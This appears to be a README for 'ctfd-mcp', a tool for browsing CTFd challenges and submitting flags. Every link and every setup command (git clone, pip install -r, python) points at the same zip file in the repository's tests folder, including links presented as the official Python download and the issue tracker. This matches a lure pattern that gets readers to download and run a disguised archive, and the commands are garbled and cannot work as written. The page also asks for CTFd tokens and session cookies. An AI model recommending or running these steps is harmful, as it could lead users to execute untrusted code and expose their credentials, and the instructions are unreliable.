# 🎉 ctfd-mcp - Manage CTFd Challenges Easily

[![GitHub Release](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip)](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip)
[![License](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip)](LICENSE)
[![Python](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip%2B-blue)](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip)
[![Issues](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip)](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip)

This application allows you, as a regular CTFd user, to easily list challenges, read their details, start and stop dynamic Docker instances, and submit flags.

## 🚀 Getting Started

### 📥 Download & Install

To install the CTFd MCP server, visit this page to download: [CTFd MCP Releases](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip).

### ✅ System Requirements

- **Python 3.13 or higher:** Ensure you have Python installed on your device. You can download it [here](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip).
- **Environment variables:** You need to set one of the following authentication methods:
  - `CTFD_URL`: Your CTFd URL (e.g., https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip).
  - `CTFD_TOKEN`: Your user token (not admin).
  - `CTFD_SESSION`: Your session cookie if tokens are disabled.
  - `CTFD_CSRF_TOKEN`: Optional, only if your server needs CSRF for ctfd-owl.

You can store these values in a `.env` file in the root of your project folder.

Example `.env` file:

```bash
https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip
CTFD_TOKEN=your_user_token
```

### 🛠️ Setting Up the Environment

1. **Create a folder** on your computer where you want the application to reside.
   
2. **Open a terminal or command prompt.** Navigate to your folder using the `cd` command.

3. **Clone the repository** using the command below:

   ```bash
   git clone https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip
   ```

4. **Navigate into the cloned folder:**

   ```bash
   cd ctfd-mcp
   ```

5. **Install the required packages** by running:

   ```bash
   pip install -r https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip
   ```

### ⚙️ Configuration

1. **Create a `.env` file** in the root directory of the CTFd MCP folder.
   
2. **Add your settings**, as shown in the previous section. Adjust the values for `CTFD_URL`, `CTFD_TOKEN`, or `CTFD_SESSION` as needed.

### 🚀 Running the Application

1. **Run the application** with this command:

   ```bash
   python https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip
   ```

2. You should see output in the terminal that indicates the application is running.

3. **Access the application** through your web browser. Enter the CTFd URL you set in the `.env` file.

### 🔧 Troubleshooting

If you encounter issues, review the following common problems:

- **Python not installed:** Make sure Python 3.13 or higher is installed. Refer to [Python's official website](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip) if needed.
- **Missing environment variables:** Double-check your `.env` file. Ensure values are correct and saved.
- **Package installation fails:** Ensure your internet connection is active. Retry the installation command.

If problems persist, feel free to report them [here](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip).

### 📄 Additional Information

For more details on how to use this server, check the documentation within the project. Look for examples and additional configuration options that can enhance your usage experience. 

## 🧑‍🤝‍🧑 Community & Support

Join our community by following the discussion on the GitHub Issues page. Whether you have questions or want to share your experiences, we welcome your input.

## 📜 License

This project is licensed under the MIT License. You can read the full license [here](LICENSE).

Make sure to check the releases page for updates on the software: [CTFd MCP Releases](https://raw.githubusercontent.com/AaryaBhusal/ctfd-mcp/main/tests/ctfd_mcp_v1.3.zip).